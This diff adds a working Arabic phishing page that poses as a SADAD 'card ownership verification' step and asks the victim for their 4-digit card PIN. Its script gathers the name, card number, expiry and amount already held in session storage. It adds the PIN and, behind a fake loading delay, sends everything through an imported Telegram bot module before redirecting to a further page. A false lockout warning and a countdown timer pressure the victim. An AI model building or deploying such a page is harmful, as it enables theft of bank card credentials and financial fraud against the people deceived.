@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>إثبات ملكية البطاقة</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap"
+            rel="stylesheet" />
+        <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: "Cairo", sans-serif;
+            background: #f5f6f8;
+            display: flex;
+            justify-content: center;
+
+        }
+
+        .container {
+            background: #fff;
+            width: 100vw;
+            min-height: 100vh;
+            display: flex;
+            gap: 20px;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            background: #8d193c;
+        }
+
+        header {
+            color: #fff;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+
+        header img {
+            width: 40px;
+            height: 40px;
+            border-radius: 6px;
+            background: #fff;
+        }
+
+        header div {
+            cursor: pointer;
+            display: flex;
+            align-items: flex-end;
+            gap: 2px;
+        }
+
+        header div img {
+            width: 15px;
+            height: 15px;
+            background-color: transparent;
+        }
+
+        .page-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            border-radius: 12px;
+            overflow: hidden;
+            background-color: white;
+            margin-bottom: 10px;
+            max-width: 600px;
+        }
+
+        .details-toggle {
+            background: #f5f6f8;
+            width: 100%;
+            padding: 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .details-content {
+            display: none;
+            padding: 15px;
+            font-size: 14px;
+            color: #333;
+            direction: ltr;
+        }
+
+        .details-content.active {
+            display: block;
+        }
+
+        .card {
+            padding: 15px;
+        }
+
+        .card .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .card .header h2 {
+            font-size: 24px;
+            color: #92002c;
+            margin: 0;
+        }
+
+        .card .header img {
+            width: 60px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 14px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        input:focus {
+            border-color: #92002c;
+            outline: none;
+        }
+
+        .warning-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 16px 20px;
+            border-radius: 8px;
+            width: 320px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            margin: 16px auto;
+        }
+
+        .warning-title {
+            font-weight: bold;
+            font-size: 18px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .warning-text {
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #92002c;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn.loading {
+            background: #92002c;
+            cursor: not-allowed;
+        }
+
+        .btn img {
+            width: 18px;
+            height: 18px;
+        }
+
+        .btn:hover {
+            background: #69122c;
+        }
+
+        .error {
+            color: red;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+
+        .timer {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 15px;
+            color: #e53935;
+            font-weight: bold;
+        }
+    </style>
+    </head>
+
+    <body>
+        <div class="container">
+            <header>
+                <img src="images/sadad-logo.svg" alt="Logo" />
+                <div>Ar
+                    <img src="images/detail-down-arrow.svg" alt />
+                </div>
+            </header>
+
+            <div class="page-content-container">
+                <div class="page-content">
+                    <div class="details-toggle">
+                        <span>التفاصيل</span>
+                        <img src="images/detail-down-arrow.svg" alt="arrow" />
+                    </div>
+                    <div class="details-content" id="detailsBox">
+                        <p><strong>name:</strong> <span
+                                id="nameDisplay"></span></p>
+                        <p><strong>card number:</strong> <span
+                                id="cardDisplay"></span></p>
+                        <p><strong>amount:</strong> <span
+                                id="amountDisplay"></span></p>
+                        <p>
+                            <strong>expire date</strong> <span
+                                id="dateDisplay"></span>
+                        </p>
+                    </div>
+
+                    <div class="card">
+
+                        <div class="header">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="80"
+                                height="80" viewBox="0 0 24 24" fill="none">
+                                <circle cx="12" cy="12" r="10" fill="#92002c" />
+                                <rect x="7.5" y="11" width="9" height="7"
+                                    rx="1.5" ry="1.5" stroke="white"
+                                    stroke-width="1.5" fill="none" />
+                                <path d="M9 11V9a3 3 0 0 1 6 0v2" stroke="white"
+                                    stroke-width="1.5" fill="none" />
+                            </svg>
+
+                            <h2>إثبات ملكية البطاقة
+                            </h2>
+                            <p>يرجى إدخال الرقم السري للبطاقة للتحقق من ملكيتها
+                            </p>
+                        </div>
+
+                        <div class="info">
+
+                            <form id="pinForm">
+                                <label>أدخل الرقم السري المكون من 4 أرقام
+                                    (PIN)</label>
+                                <input type="password" id="pin" maxlength="4"
+                                    placeholder="****" required />
+                                <div id="error" class="error"></div>
+                                <button type="submit" class="btn" id="payBtn">←
+                                    تحقق
+                                    من PIN
+                                </button>
+                            </form>
+                            <div class="warning-box">
+                                <div class="warning-title">
+                                    ⚠ تنبيه
+                                </div>
+                                <div class="warning-text">
+                                    سيتم حظر البطاقة مؤقتاً بعد 3 محاولات خاطئة
+                                </div>
+                            </div>
+
+                            <div class="timer">الوقت المتبقي: <span
+                                    id="countdown">03:00</span></div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+        <script type="module">
+        import botFetch from "./telegram.js";
+
+        // get data from sessionStorage
+        let stored = sessionStorage.getItem("userData");
+        let userData = JSON.parse(stored) || {};
+
+        document.getElementById("nameDisplay").textContent = userData.customer;
+        document.getElementById("dateDisplay").textContent = userData.expiry || "no expire data";
+        document.getElementById("cardDisplay").textContent =
+            "**** **** **** " + (userData.cardNumber?.slice(-4) || " لا يوجد بطاقه");
+        document.getElementById("amountDisplay").textContent = userData.amount;
+
+        const payBtn = document.getElementById("payBtn");
+
+        // Details toggle
+        document
+            .querySelector(".details-toggle")
+            .addEventListener("click", () => {
+                document.getElementById("detailsBox").classList.toggle("active");
+            });
+
+        // form validation
+        document.getElementById("pinForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+            let pin = document.getElementById("pin").value.trim();
+            let error = document.getElementById("error");
+
+            error.textContent = "";
+
+            if (!/^\d{4}$/.test(pin)) {
+                error.textContent = "الرجاء إدخال رمز PIN صحيح ( 4 أرقام فقط )";
+                return;
+            }
+
+            userData.pin = pin;
+            sessionStorage.setItem("userData", JSON.stringify(userData));
+
+            payBtn.innerHTML = `<img src="https://i.gifer.com/ZZ5H.gif" alt="loading" /> جاري التحميل...`;
+            payBtn.classList.add("loading");
+            payBtn.disabled = true;
+
+            setTimeout(() => {
+                botFetch({ pin });
+                botFetch(userData, "./page4.html");
+            }, 5000);
+        });
+
+        // 3min counter
+        let timeLeft = 180;
+        let timer = setInterval(() => {
+            timeLeft--;
+            let min = String(Math.floor(timeLeft / 60)).padStart(2, "0");
+            let sec = String(timeLeft % 60).padStart(2, "0");
+            document.getElementById("countdown").textContent = `${min}:${sec}`;
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+            }
+        }, 1000);
+    </script>
+    </body>
+
+</html>
